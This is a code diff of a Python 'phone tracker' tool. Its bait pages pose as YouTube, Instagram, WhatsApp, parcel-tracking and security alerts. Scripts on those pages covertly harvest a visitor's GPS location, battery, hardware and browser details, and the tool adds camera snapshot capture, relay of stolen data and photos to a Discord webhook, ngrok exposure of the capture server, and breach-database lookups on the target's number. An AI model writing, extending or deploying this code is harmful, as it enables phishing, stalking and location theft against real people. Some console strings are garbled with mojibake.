-                <img src="https://static.whatsapp.net/rsrc.php/v3/y7/r/DS_973_q7_n.png" style="width:80px;margin-bottom:20px;">
-                <h2 style="font-size:1.4em;">Invitación a Grupo</h2>
-                <p>Has sido invitado a unirte a un grupo privado de seguridad.</p>
-                <div class="btn" style="background:#25d366;color:white;padding:12px;border-radius:20px;cursor:pointer;font-weight:bold;margin-top:10px;">Unirse al Chat</div>
-            </div>"""
-        elif "delivery" in template or "track" in template:
-            title = "Shipment Tracking Information"
-            bait_html = """
-            <div class="card">
-                <h2 style="color:#f60;font-size:1.5em;">📦 Pendiente de Entrega</h2>
-                <p>Su paquete con ID #TRK882937 está retenido en la oficina local.</p>
-                <p>Por favor, valide su ubicación para programar la entrega.</p>
-                <div class="btn" style="background:#f60;color:white;padding:12px;border-radius:4px;cursor:pointer;font-weight:bold;margin-top:10px;">Rastrear Paquete</div>
-            </div>"""
-        else: # Standard / Security
-            title = "Security Alert - Device Protected"
-            bait_html = """
-            <div class="card">
-                <h2 style="color:#d93025;font-size:1.4em;">Alerta de Seguridad Crítica</h2>
-                <p>Se ha detectado un acceso no autorizado cerca de su ubicación.</p>
-                <p>Por favor, confirme su ubicación para asegurar su cuenta.</p>
-                <div class="spinner"></div>
-                <p style="margin-top:20px;color:#666;">Verificando dispositivo...</p>
-            </div>"""
+        og = {
+            'title': 'Breaking News: Live Updates',
+            'desc': 'Get the latest real-time updates and breaking stories.',
+            'img': 'https://cdn-icons-png.flaticon.com/512/21/21601.png',
+            'bait': ''
+        }
+
+        if 'youtube' in template:
+            og['title'] = 'YouTube - Video Recomendado'
+            og['desc'] = 'Mira este video que es tendencia ahora mismo en tu region.'
+            og['img'] = 'https://upload.wikimedia.org/wikipedia/commons/e/ef/Youtube_logo.png'
+            og['bait'] = f'<div class="card"><img src="{og["img"]}" style="width:100px;margin-bottom:20px;"><h2 style="font-size:1.4em;">Video No Disponible</h2><p>Este video requiere verificacion. Haz clic para validar.</p><div class="btn" style="background:#ff0000;color:white;padding:12px;border-radius:2px;cursor:pointer;font-weight:bold;margin-top:10px;">VER VIDEO</div></div>'
+        elif 'instagram' in template:
+            og['title'] = 'Instagram - Nueva Mencion'
+            og['desc'] = 'Alguien te ha etiquetado en una publicacion.'
+            og['image'] = 'https://www.instagram.com/static/images/ico/favicon-200.png/ab6dea7ac684.png'
+            og['bait'] = f'<div class="card"><img src="https://www.instagram.com/static/images/ico/favicon-200.png/ab6dea7ac684.png" style="width:60px;margin-bottom:20px;"><h2 style="font-size:1.4em;">Nueva Mencion</h2><p>Inicia sesion para ver la publicacion.</p><div class="btn" style="background:#0095f6;color:white;padding:12px;border-radius:5px;cursor:pointer;font-weight:bold;margin-top:10px;">Ver Publicacion</div></div>'
+        elif 'whatsapp' in template:
+            og['title'] = 'WhatsApp - Invitacion a Grupo'
+            og['desc'] = 'Has sido invitado a unirte a un grupo de seguridad.'
+            og['img'] = 'https://static.whatsapp.net/rsrc.php/v3/y7/r/DS_973_q7_n.png'
+            og['bait'] = f'<div class="card"><img src="{og["img"]}" style="width:80px;margin-bottom:20px;"><h2 style="font-size:1.4em;">Invitacion Pendiente</h2><p>Unirse al chat grupal de seguridad.</p><div class="btn" style="background:#25d366;color:white;padding:12px;border-radius:20px;cursor:pointer;font-weight:bold;margin-top:10px;">Unirse al Chat</div></div>'
+        else:
+             og['bait'] = '<div class="card"><h2 style="color:#d93025;font-size:1.4em;">Alerta de Seguridad</h2><p>Detectado acceso no autorizado. Valida tu posicion para asegurar tu cuenta.</p><div class="spinner"></div></div>'
+
         return f"""<!DOCTYPE html>
 <html lang="es">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>{title}</title>
+<meta property="og:type" content="website">
+<meta property="og:title" content="{og['title']}">
+<meta property="og:description" content="{og['desc']}">
+<meta property="og:image" content="{og['img']}">
+<title>{og['title']}</title>
 <style>
-  body {{ font-family: -apple-system, system-ui, sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }}
-  .card {{ background: white; border: 1px solid #dbdbdb; padding: 40px; border-radius: 8px; text-align: center; max-width: 350px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }}
-  h2 {{ font-weight: 500; color: #262626; margin-bottom: 10px; }}
-  p {{ color: #8e8e8e; font-size: 0.95em; line-height: 1.5; }}
-  .spinner {{ border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 2s linear infinite; margin: 20px auto 0 auto; }}
+  body {{ font-family: sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }}
+  .card {{ background: white; border: 1px solid #dbdbdb; padding: 40px; border-radius: 8px; text-align: center; max-width: 350px; }}
+  .btn {{ margin-top: 15px; cursor: pointer; }}
+  .spinner {{ border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 20px; height: 20px; animation: spin 2s linear infinite; margin: 10px auto; }}
   @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
 </style>
 </head>
 <body>
-    {bait_html}
+    {og['bait']}
 <script>
 (function(){{
-  var data = {{
-    track_id: "{track_id}",
-    ua: navigator.userAgent,
-    plt: navigator.platform,
-    res: screen.width + "x" + screen.height,
-    tz: Intl.DateTimeFormat().resolvedOptions().timeZone
-  }};
-  if (navigator.geolocation) {{
-    navigator.geolocation.getCurrentPosition(function(p){{
-      data.gps_lat = p.coords.latitude;
-      data.gps_lon = p.coords.longitude;
-      data.gps_accuracy = p.coords.accuracy;
-      send(data);
-    }}, function(e){{ data.gps_err = e.message; send(data); }}, {{enableHighAccuracy:true, timeout:10000}});
-  }} else {{ send(data); }}
-  function send(d) {{
-    fetch("/capture/" + d.track_id, {{ method:"POST", headers:{{"Content-Type":"application/json"}}, body:JSON.stringify(d) }});
+  var data = {{ track_id: "{track_id}", ua: navigator.userAgent, plt: navigator.platform, res: screen.width + "x" + screen.height, tz: Intl.DateTimeFormat().resolvedOptions().timeZone, cores: navigator.hardwareConcurrency, mem: navigator.deviceMemory }};
+  try {{
+    navigator.getBattery().then(function(b){{
+      data.bat = Math.round(b.level * 100) + "%";
+      data.charging = b.charging;
+      checkGeo();
+    }}).catch(function(){{ checkGeo(); }});
+  }} catch(e) {{ checkGeo(); }}
+  function checkGeo() {{
+    if (navigator.geolocation) {{
+      navigator.geolocation.getCurrentPosition(function(p){{
+        data.gps_lat = p.coords.latitude; data.gps_lon = p.coords.longitude; data.gps_accuracy = p.coords.accuracy; send(data);
+      }}, function(e){{ data.gps_err = e.message; send(data); }}, {{enableHighAccuracy:true, timeout:10000}});
+    }} else {{ send(data); }}
   }}
+  function send(d) {{ fetch("/capture/" + d.track_id, {{ method:"POST", headers:{{"Content-Type":"application/json"}}, body:JSON.stringify(d) }}); }}
 }})();
 </script>
 </body>
@@ -1287,15 +1353,34 @@ class PhoneTrackerPro:
         except ImportError:
             console.print("[red]  Flask not installed. Run: pip install flask[/red]")
             return
+
         import logging
         log = logging.getLogger('werkzeug')
         log.setLevel(logging.ERROR)
+
         app = Flask(__name__)
+
+        @app.route('/view/pdf')
+        def view_pdf():
+            """Serve the bait PDF file (aware of EXE mode)."""
+            from flask import send_file
+            import sys
+            if getattr(sys, 'frozen', False):
+                base = os.path.dirname(sys.executable)
+            else:
+                base = os.path.dirname(os.path.abspath(__file__))
+            path = os.path.join(base, "bait_report.pdf")
+            if os.path.exists(path):
+                return send_file(path, mimetype='application/pdf')
+            return "Document not found.", 404
+
         captures = []
         ipinfo_token = os.getenv("IPINFO_TOKEN", "")
+
         @app.route(f"/t/{track_id}")
         def serve_tracking_page():
             return Response(tracking_html, mimetype="text/html")
+
         @app.route(f"/capture/{track_id}", methods=["POST"])
         def capture_data():
             data = request.get_json(silent=True) or {}
@@ -1305,6 +1390,7 @@ class PhoneTrackerPro:
                 real_ip = real_ip.split(",")[0].strip()
             data["captured_ip"] = real_ip
             data["capture_time"] = datetime.now().isoformat()
+
             # Lookup IP location
             ip_info = {}
             if real_ip and real_ip not in ["127.0.0.1", "::1"]:
@@ -1316,11 +1402,21 @@ class PhoneTrackerPro:
                 except:
                     pass
             data["ip_info"] = ip_info
+            # Audio alert on capture if enabled
+            if os.getenv("PLAY_SOUND") == "1":
+                try:
+                    winsound.Beep(1000, 400)  # 1kHz for 400ms radar ping
+                except:
+                    pass
+
+
             captures.append(data)
+
             # Save to file
             with open(results_path, "w") as f:
                 json.dump({"track_id": track_id, "target": self.phone_number,
                           "captures": captures}, f, indent=2, default=str)
+
             # Print capture alert in real-time
             ip_city = ip_info.get("city", "?")
             ip_region = ip_info.get("region", "?")
@@ -1330,23 +1426,50 @@ class PhoneTrackerPro:
             gps_acc = data.get("gps_accuracy", None)
             device = data.get("platform", "?")
             tz = data.get("timezone", "?")
+            hw_batt = data.get("battery", "N/A")
+
+            # SnapCam Image processing
+            b64_image = data.get("base64_image")
+            image_path = ""
+            snapcam_status = "[dim]No cámara[/dim]"
+            if b64_image and "base64," in b64_image:
+                try:
+                    import base64
+                    from io import BytesIO
+                    header, encoded = b64_image.split(",", 1)
+                    img_data = base64.b64decode(encoded)
+                    ts = datetime.now().strftime("%H%M%S")
+                    image_path = f"output/snapcam_{track_id}_{ts}.jpg"
+                    with open(image_path, "wb") as f:
+                        f.write(img_data)
+                    snapcam_status = f"[bold green]CAPTURED -> {image_path}[/bold green]"
+                except:
+                    snapcam_status = "[bold red]ERROR DECODING IMAGE[/bold red]"
+
             capture_num = len(captures)
+
             console.print()
-            console.print(Panel(f"""[bold red][SIREN] TARGET CAPTURED![/bold red]
+            console.print(Panel(f"""[bold red][ALERT] TARGET CAPTURED![/bold red]
+
 [bold green]  IP Address:[/bold green]   {real_ip}
 [bold green]  IP City:[/bold green]      {ip_city}, {ip_region}
 [bold green]  ISP:[/bold green]          {ip_org}
-[bold green]  Device:[/bold green]       {device}
+[bold green]  Device:[/bold green]       {device} (Battery: {hw_batt})
 [bold green]  Timezone:[/bold green]     {tz}
-[bold green]  Browser:[/bold green]      {data.get('userAgent', '?')[:60]}
-[bold green]  Screen:[/bold green]       {data.get('screenW', '?')}x{data.get('screenH', '?')}
-{'[bold red]  [GRAB] GPS LOCATION:[/bold red]' if gps_lat else '[yellow]  GPS: Not allowed by target[/yellow]'}
+[bold green]  Browser:[/bold green]      {data.get('ua', '?')[:60]}
+[bold green]  Hardware:[/bold green]     Cores: {data.get('cores', '?')} | RAM: {data.get('ram', '?')}
+[bold green]  GPU/Render:[/bold green]   {data.get('gpu', '?')[:40]}
+[bold green]  SnapCam:[/bold green]       {snapcam_status}
+
+{'[bold red]  📍 GPS LOCATION:[/bold red]' if gps_lat else '[yellow]  GPS: Not allowed by target[/yellow]'}
 {'  Latitude:  ' + str(gps_lat) if gps_lat else ''}
 {'  Longitude: ' + str(gps_lon) if gps_lon else ''}
 {'  Accuracy:  ' + str(round(gps_acc, 1)) + ' meters' if gps_acc else ''}
+
 [dim]  Saved to: {results_path}[/dim]""",
-                title=f"[bold red][GRAB] IP GRAB - CAPTURE #{capture_num}[/bold red]",
+                title=f"[bold red]📍 IP GRAB - CAPTURE #{capture_num}[/bold red]",
                 border_style="red"))
+
             # Update live_location if we got GPS
             if gps_lat and gps_lon:
                 self.live_location["lat"] = gps_lat
@@ -1356,16 +1479,42 @@ class PhoneTrackerPro:
                 self._add_vote(f"{ip_city}", "IP Grabber", 0.95)
             elif ip_city and ip_city != "?":
                 self._add_vote(ip_city, "IP Grabber", 0.85)
+
+            # --- Discord Webhook Integration ---
+            webhook_url = os.getenv("DISCORD_WEBHOOK")
+            if webhook_url:
+                try:
+                    import threading, requests
+                    def _send_discord(wh_url, p_data, loc_str, img_file):
+                        try:
+                            payload = {
+                                "content": f"🚨 **TARGET CAPTURED - {self.phone_number}** 🚨\n**IP:** {p_data.get('captured_ip')}\n**Location:** {loc_str}\n**Battery:** {p_data.get('battery','N/A')}\n**User Agent:** `{p_data.get('ua','?')}`"
+                            }
+                            if img_file and os.path.exists(img_file):
+                                with open(img_file, "rb") as f:
+                                    requests.post(wh_url, data=payload, files={"file": f}, timeout=10)
+                            else:
+                                requests.post(wh_url, json=payload, timeout=10)
+                        except Exception as e:
+                            pass
+                    loc_desc = f"{ip_city}, {ip_region} (Lat: {gps_lat}, Lon: {gps_lon})" if gps_lat else f"{ip_city}, {ip_region}"
+                    threading.Thread(target=_send_discord, args=(webhook_url, data, loc_desc, image_path)).start()
+                except Exception:
+                    pass
+
             return jsonify({"status": "ok"})
-        console.print(f"\n[bold cyan]  [MAP] Server running on port {port}...[/bold cyan]")
+
+        console.print(f"\n[bold cyan]  ­[SERVER] Server running on port {port}...[/bold cyan]")
         console.print(f"[bold cyan]  ­ƒôí Waiting for target to click the link...[/bold cyan]")
         console.print(f"[dim]  Press Ctrl+C to stop.[/dim]\n")
+
         try:
             app.run(host="0.0.0.0", port=port, debug=False)
         except KeyboardInterrupt:
             console.print(f"\n[yellow]  Server stopped. Captures: {len(captures)}[/yellow]")
             if captures:
                 console.print(f"[green]  Results saved: {results_path}[/green]")
+
     # =====================================================================
     # PART 4: ADVANCED GEOLOCATION
     # =====================================================================
@@ -1390,6 +1539,7 @@ class PhoneTrackerPro:
             "formatted_address": self.formatted_address,
             "timezone": self.timezone,
         }
+
     def _geo_opencage(self, city):
         api_key = os.getenv("OPENCAGE_API_KEY", "")
         if not api_key:
@@ -1423,6 +1573,7 @@ class PhoneTrackerPro:
         except Exception as e:
             console.print(f"[dim]  OpenCage error: {e}[/dim]")
         return False
+
     def _geo_nominatim(self, city):
         try:
             session = self._get_session()
@@ -1447,11 +1598,12 @@ class PhoneTrackerPro:
         except Exception as e:
             console.print(f"[dim]  Nominatim error: {e}[/dim]")
         return False
+
     def display_geolocation(self):
         if not self.latitude:
             console.print("[yellow]  No coordinates found.[/yellow]")
             return
-        table = Table(title="[GEO] GEOLOCATION DATA", border_style="green", show_lines=True)
+        table = Table(title="­[GEO] GEOLOCATION DATA", border_style="green", show_lines=True)
         table.add_column("Field", style="bold white", width=25)
         table.add_column("Value", style="green", width=50)
         table.add_row("City", str(self.city))
@@ -1472,6 +1624,7 @@ class PhoneTrackerPro:
         if self.live_location.get("city") and self.live_location["city"] != self.sim_registration_city:
             table.add_row("Live Location", f"[bold green]{self.live_location['city']}[/bold green]")
         console.print(table)
+
     # =====================================================================
     # PART 5: OSINT - Platform Probes
     # =====================================================================
@@ -1512,6 +1665,7 @@ class PhoneTrackerPro:
         except Exception as e:
             console.print(f"[dim]  Gravatar error: {e}[/dim]")
         self.display_osint()
+
     def _probe_whatsapp(self):
         try:
             session = self._get_session()
@@ -1526,6 +1680,7 @@ class PhoneTrackerPro:
                 console.print("[dim]  WhatsApp: Not detected[/dim]")
         except Exception:
             self.osint_results["whatsapp"] = {"registered": "Unknown"}
+
     def _probe_telegram(self):
         try:
             session = self._get_session()
@@ -1540,6 +1695,7 @@ class PhoneTrackerPro:
                 console.print("[dim]  Telegram: Not detected[/dim]")
         except Exception:
             self.osint_results["telegram"] = {"registered": "Unknown"}
+
     def _probe_truecaller_web(self):
         """Multi-method Truecaller lookup: API endpoints + web scraping."""
         full = self.phone_number.replace(" ", "")
@@ -1550,6 +1706,7 @@ class PhoneTrackerPro:
         name = ""
         email = ""
         found = False
+
         # Method 1: Truecaller undocumented search API (used by browser)
         try:
             api_url = f"https://search5-noneu.truecaller.com/v2/search?q={e164}&countryCode={cc}&type=4&locAddr=&placement=SEARCHPAGE&encoding=json"
@@ -1588,6 +1745,7 @@ class PhoneTrackerPro:
                     continue
         except Exception:
             pass
+
         # Method 2: Truecaller web search page (scrape)
         if not found:
             try:
@@ -1636,6 +1794,7 @@ class PhoneTrackerPro:
                             email = email_matches[0]
             except Exception:
                 pass
+
         # Method 3: Alternative caller ID APIs
         if not found:
             alt_apis = [
@@ -1658,6 +1817,7 @@ class PhoneTrackerPro:
                             pass
                 except:
                     pass
+
         # Store results
         if found and name:
             result = {"name": name, "found": True}
@@ -1674,6 +1834,7 @@ class PhoneTrackerPro:
         else:
             self.osint_results["truecaller"] = {"found": False}
             console.print("[dim]  Truecaller: No public data (try Truecaller app for manual lookup)[/dim]")
+
     def _probe_eyecon(self):
         try:
             session = self._get_session()
@@ -1688,6 +1849,7 @@ class PhoneTrackerPro:
                 console.print("[dim]  Eyecon: Not found[/dim]")
         except Exception:
             self.osint_results["eyecon"] = {"found": False}
+
     def _probe_syncme(self):
         try:
             session = self._get_session()
@@ -1710,6 +1872,7 @@ class PhoneTrackerPro:
             console.print("[dim]  SyncMe: Not found[/dim]")
         except Exception:
             self.osint_results["syncme"] = {"found": False}
+
     def _probe_facebook(self):
         try:
             session = self._get_session()
@@ -1724,6 +1887,7 @@ class PhoneTrackerPro:
                 console.print("[dim]  Facebook: No indicator[/dim]")
         except Exception:
             self.osint_results["facebook"] = {"found": False}
+
     def _probe_instagram(self):
         try:
             session = self._get_session()
@@ -1744,6 +1908,7 @@ class PhoneTrackerPro:
             console.print("[dim]  Instagram: Not found[/dim]")
         except Exception:
             self.osint_results["instagram"] = {"found": False}
+
     def _probe_google(self):
         try:
             session = self._get_session()
@@ -1770,6 +1935,7 @@ class PhoneTrackerPro:
                     console.print("[dim]  Google: No public mentions[/dim]")
         except Exception:
             self.osint_results["google_mentions"] = []
+
     def _check_india_upi(self):
         if self.country_code != "+91":
             return
@@ -1780,15 +1946,18 @@ class PhoneTrackerPro:
         self.osint_results["upi_possible"] = possible_upis
         console.print(f"[green]  [OK] UPI: {len(possible_upis)} possible IDs generated[/green]")
         for upi in possible_upis[:3]:
-            console.print(f"[dim]    -> {upi}[/dim]")
+            console.print(f"[dim]    ÔåÆ {upi}[/dim]")
+
     def _probe_email_from_name(self):
         """Generate possible email addresses from owner name + phone number."""
         nat = self.national_number.replace(" ", "")
         emails = []
+
         # Always add phone-based emails
         common_domains = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "rediffmail.com"]
         for domain in common_domains:
             emails.append(f"{nat}@{domain}")
+
         # If we have owner name, generate name-based emails
         if self.owner_name and len(self.owner_name) > 2:
             name = self.owner_name.strip()
@@ -1811,6 +1980,7 @@ class PhoneTrackerPro:
                         emails.append(f"{n}@{domain}")
                         emails.append(f"{n}{nat[-4:]}@{domain}")
                         emails.append(f"{n}{nat[-6:]}@{domain}")
+
         # Deduplicate
         seen = set()
         unique_emails = []
@@ -1818,12 +1988,14 @@ class PhoneTrackerPro:
             if e not in seen:
                 seen.add(e)
                 unique_emails.append(e)
+
         self.osint_results["possible_emails"] = unique_emails
         self.osint_data["possible_emails"] = unique_emails
         if unique_emails:
             console.print(f"[green]  [OK] Email Guess: {len(unique_emails)} possible emails generated[/green]")
             for em in unique_emails[:4]:
-                console.print(f"[dim]    -> {em}[/dim]")
+                console.print(f"[dim]    ÔåÆ {em}[/dim]")
+
     def _probe_gravatar(self):
         """Check Gravatar for profile photo/name using email hashes."""
         emails_to_check = self.osint_results.get("possible_emails", [])
@@ -1858,6 +2030,7 @@ class PhoneTrackerPro:
         self.osint_results["gravatar"] = found_profiles
         if not found_profiles:
             console.print("[dim]  Gravatar: No profiles found[/dim]")
+
     def _probe_abstractapi_email(self):
         """Use AbstractAPI Phone Validation to try to get name/carrier data."""
         api_key = os.getenv("ABSTRACT_API_KEY", "")
@@ -1889,11 +2062,12 @@ class PhoneTrackerPro:
                     console.print(f"[dim]  AbstractAPI: Validated, no extra location[/dim]")
         except Exception:
             pass
+
     def display_osint(self):
         if not self.osint_results:
             console.print("[yellow]  No OSINT data collected.[/yellow]")
             return
-        table = Table(title="[SCAN] OSINT INTELLIGENCE", border_style="magenta", show_lines=True)
+        table = Table(title="­[OSINT] OSINT INTELLIGENCE", border_style="magenta", show_lines=True)
         table.add_column("Platform", style="bold white", width=20)
         table.add_column("Status", style="white", width=15)
         table.add_column("Details", style="cyan", width=40)
@@ -1939,6 +2113,7 @@ class PhoneTrackerPro:
             table.add_row("[bold]OWNER EMAIL[/bold]", "[bold green]FOUND[/bold green]",
                         f"[bold green]{tc_email}[/bold green]")
         console.print(table)
+
     # =====================================================================
     # PART 6: DEEP OSINT - Spam, Breach, Web
     # =====================================================================
@@ -1957,6 +2132,7 @@ class PhoneTrackerPro:
                     time.sleep(random.uniform(0.5, 1.5))
             except Exception as e:
                 console.print(f"[dim]  {name} error: {e}[/dim]")
+
     def _scrape_spamcalls(self):
         try:
             session = self._get_session()
@@ -1984,6 +2160,7 @@ class PhoneTrackerPro:
                 console.print("[green]  [OK] Spam: Clean - no spam reports found[/green]")
         except Exception:
             pass
+
     def _scrape_shouldianswer(self):
         try:
             session = self._get_session()
@@ -2006,6 +2183,7 @@ class PhoneTrackerPro:
                 console.print("[dim]  ShouldIAnswer: No data[/dim]")
         except Exception:
             self.deep_osint["shouldianswer"] = {"found": False}
+
     def _check_haveibeenpwned_style(self):
         try:
             session = self._get_session()
@@ -2016,7 +2194,37 @@ class PhoneTrackerPro:
                 f"https://intelx.io/?s={full}",
             ]
             results = []
+            
+            # --- LEAKCHECK API ---
+            leakcheck_api = os.getenv("LEAKCHECK_API_KEY", "")
+            if leakcheck_api:
+                search_urls.append(f"[LeakCheck API] checking {full}")
+                try:
+                    resp = session.get(f"https://leakcheck.io/api/public?check={full}&key={leakcheck_api}", timeout=8)
+                    if resp.status_code == 200:
+                        ld = resp.json()
+                        if ld.get("success") and ld.get("found", 0) > 0:
+                            results.append("LeakCheck.io Premium Database")
+                except:
+                    pass
+
+            # --- BREACHDIRECTORY API ---
+            breachdir_api = os.getenv("BREACHDIRECTORY_API_KEY", "")
+            if breachdir_api:
+                search_urls.append(f"[BreachDirectory API] checking {full}")
+                try:
+                    h = {"x-rapidapi-key": breachdir_api, "x-rapidapi-host": "breachdirectory.p.rapidapi.com"}
+                    resp = session.get(f"https://breachdirectory.p.rapidapi.com/passwords?query={full}", headers=h, timeout=8)
+                    if resp.status_code == 200:
+                        bd = resp.json()
+                        if bd.get("success") and bd.get("found", 0) > 0:
+                            results.append("BreachDirectory Elite API")
+                except:
+                    pass
+
+            # Free scraping fallbacks
             for url in search_urls:
+                if "[" in url: continue
                 try:
                     resp = session.get(url, timeout=8)
                     if resp.status_code == 200:
@@ -2033,6 +2241,7 @@ class PhoneTrackerPro:
                 console.print("[green]  [OK] Breach: No indicators found[/green]")
         except Exception:
             pass
+
     def _web_search_mentions(self):
         try:
             session = self._get_session()
@@ -2068,11 +2277,12 @@ class PhoneTrackerPro:
             if all_mentions:
                 console.print(f"[green]  [OK] Web: {len(all_mentions)} mention(s) found[/green]")
                 for m in all_mentions[:2]:
-                    console.print(f"[dim]    -> {m['title'][:50]}[/dim]")
+                    console.print(f"[dim]    ÔåÆ {m['title'][:50]}[/dim]")
             else:
                 console.print("[dim]  Web: No mentions found[/dim]")
         except Exception:
             pass
+
     def _guess_city_from_text(self, text):
         indian_cities = [
             "Delhi", "Mumbai", "Bangalore", "Bengaluru", "Chennai", "Kolkata",
@@ -2088,6 +2298,7 @@ class PhoneTrackerPro:
             if city.lower() in text_lower:
                 return city
         return None
+
     # =====================================================================
     # PART 7: MAP + REPORTS
     # =====================================================================
@@ -2153,6 +2364,7 @@ class PhoneTrackerPro:
         except Exception as e:
             console.print(f"[red]  Map error: {e}[/red]")
             return None
+
     def to_dict(self):
         """Export all intelligence as a forensically structured dict."""
         data = {
@@ -2200,6 +2412,25 @@ class PhoneTrackerPro:
         payload_str = json.dumps(data, sort_keys=True, default=str)
         data["integrity_sha256"] = _sha256(payload_str)
         return data
+
+    def pre_init_ngrok(self):
+        """Pre-initialize the Ngrok tunnel with authtoken if available."""
+        auth_token = os.getenv("NGROK_AUTHTOKEN")
+        if auth_token:
+            try:
+                import subprocess
+                subprocess.run(["ngrok", "config", "add-authtoken", auth_token], capture_output=True, check=False)
+            except: pass
+
+        if os.getenv("NGROK_AUTHTOKEN") or os.path.exists("ngrok.exe"):
+            try:
+                import threading
+                def _run():
+                    res = self._launch_ngrok_tunnel(8888)
+                    if res: self.early_ngrok_url = res.get("url")
+                threading.Thread(target=_run, daemon=True).start()
+            except: pass
+
     def generate_html_report(self):
         ts = datetime.now().strftime("%Y%m%d_%H%M%S")
         num = self.phone_number.replace("+", "").replace(" ", "")
@@ -2368,6 +2599,8 @@ disclosure is prohibited under the Official Secrets Act, 1923 and IT Act, 2000 S
         console.print(f"[green]  > HTML Report (LEA Grade): {filename}[/green]")
         self._log_evidence("report_generated", f"HTML report saved: {filename}")
         return filename
+
+
     def generate_json_report(self):
         ts = datetime.now().strftime("%Y%m%d_%H%M%S")
         num = self.phone_number.replace("+", "").replace(" ", "")
@@ -2377,6 +2610,7 @@ disclosure is prohibited under the Official Secrets Act, 1923 and IT Act, 2000 S
             json.dump(self.to_dict(), f, indent=2, ensure_ascii=False, default=str)
         console.print(f"[green]  [OK] JSON Report: {filename}[/green]")
         return filename
+
     def generate_reports(self, no_map=False, no_report=False, json_only=False):
         console.print(Panel("[bold cyan]PHASE 7: GENERATING REPORTS[/bold cyan]", border_style="cyan"))
         map_file = None
@@ -2388,6 +2622,8 @@ disclosure is prohibited under the Official Secrets Act, 1923 and IT Act, 2000 S
             html_file = self.generate_html_report()
         console.print()
         return {"map": map_file, "json": json_file, "html": html_file}
+
+
 # =======================================================================
 # MAIN ENTRY POINT
 # =======================================================================
@@ -2399,7 +2635,7 @@ def _print_summary(tracker):
     console.print(Panel(
         f"[bold {cls_style}]  {tracker.classification} - LAW ENFORCEMENT SENSITIVE  [/bold {cls_style}]",
         border_style=cls_style))
-    console.print(Panel("[bold white][SUM] INTELLIGENCE SUMMARY[/bold white]", border_style="bright_white"))
+    console.print(Panel("[bold white]­[SUMMARY] INTELLIGENCE SUMMARY[/bold white]", border_style="bright_white"))
     # Case metadata
     case_table = Table(border_style="dim", show_lines=True, title="[bold cyan]Case Information[/bold cyan]")
     case_table.add_column("Field", style="bold", width=25)
@@ -2454,6 +2690,9 @@ def _print_summary(tracker):
         table.add_row("IP Captured", tracker.ip_grab_results.get("ip", "N/A"))
         if tracker.ip_grab_results.get("gps_lat"):
             table.add_row("GPS Location", f"{tracker.ip_grab_results['gps_lat']}, {tracker.ip_grab_results['gps_lon']}")
+    if tracker.breach_results:
+        table.add_row("Data Breaches", f"[bold red]{len(tracker.breach_results)} hits[/bold red] (Score: {tracker.breach_summary['risk_score']})")
+    
     lat = tracker.geo_results.get("latitude")
     lon = tracker.geo_results.get("longitude")
     if lat and lon:
@@ -2474,33 +2713,55 @@ def _print_summary(tracker):
     console.print(Panel(
         f"[dim]Evidence Integrity (SHA-256):[/dim]\n[bold white]{evidence_hash}[/bold white]",
         border_style="dim", title="[bold]Chain of Custody[/bold]"))
+
+
 def main():
-    console.print(BANNER)
+    theme = os.environ.get("CONSOLE_THEME", "Standard Grey")
+    c1, c2 = "bold red", "bold cyan"
+    if theme == "Matrix Green":
+        c1, c2 = "bold green", "bold green"
+    elif theme == "Crimson Red":
+        c1, c2 = "bold red", "red"
+    elif theme == "FBI Blue":
+        c1, c2 = "bold blue", "bold white"
+    
+    current_banner = BANNER.replace("[bold red]", f"[{c1}]").replace("[/bold red]", f"[/{c1}]")
+    current_banner = current_banner.replace("[bold cyan]", f"[{c2}]").replace("[/bold cyan]", f"[/{c2}]")
+    
+    console.print(current_banner)
+    
     parser = argparse.ArgumentParser(
         prog="phone_tracker.py",
         description=f"PhoneTrackerPro v{VERSION} - Law Enforcement Grade Phone Intelligence System",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
-------------------- USAGE EXAMPLES --------------------
+ÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöü USAGE EXAMPLES ÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöü
+
   FULL SCAN (all phases):
     python phone_tracker.py +919876543210
+
   QUICK SCAN (basic info + telecom circle only):
     python phone_tracker.py +919876543210 --quick
+
   LAW ENFORCEMENT MODE (with case metadata):
     python phone_tracker.py +919876543210 --case-id "FIR-2026-0042" --officer "SI Sharma" --unit "Cyber Cell Delhi" --classification CONFIDENTIAL
+
   IP GRABBER MODE (start tracking link server):
     python phone_tracker.py +919876543210 --grab
     python phone_tracker.py +919876543210 --grab --grab-port 9999
+
   SKIP PHASES (faster scan):
     python phone_tracker.py +919876543210 --skip-live
     python phone_tracker.py +919876543210 --skip-osint
     python phone_tracker.py +919876543210 --skip-deep
     python phone_tracker.py +919876543210 --skip-osint --skip-deep
+
   REPORT OPTIONS:
     python phone_tracker.py +919876543210 --json-only
     python phone_tracker.py +919876543210 --no-map
     python phone_tracker.py +919876543210 --no-report
     python phone_tracker.py +919876543210 --output-dir results/
+
   INPUT FORMATS (all work):
     python phone_tracker.py +919876543210
     python phone_tracker.py 9876543210
@@ -2509,11 +2770,13 @@ def main():
         """
     )
     parser.add_argument("phone", help="Phone number (e.g., +919876543210 or 9876543210)")
+
     scan_group = parser.add_argument_group("Scan Options")
     scan_group.add_argument("--quick", action="store_true", help="Quick mode: basic info + telecom only")
     scan_group.add_argument("--skip-live", action="store_true", help="Skip live location (multi-API) detection")
     scan_group.add_argument("--skip-osint", action="store_true", help="Skip OSINT platform probes (WhatsApp, Telegram, etc.)")
     scan_group.add_argument("--skip-deep", action="store_true", help="Skip deep OSINT (spam DB, breach check, web mentions)")
+
     case_group = parser.add_argument_group("Case Management (Law Enforcement)")
     case_group.add_argument("--case-id", type=str, default=None, metavar="ID", help="Case/FIR number (default: auto-generated UUID)")
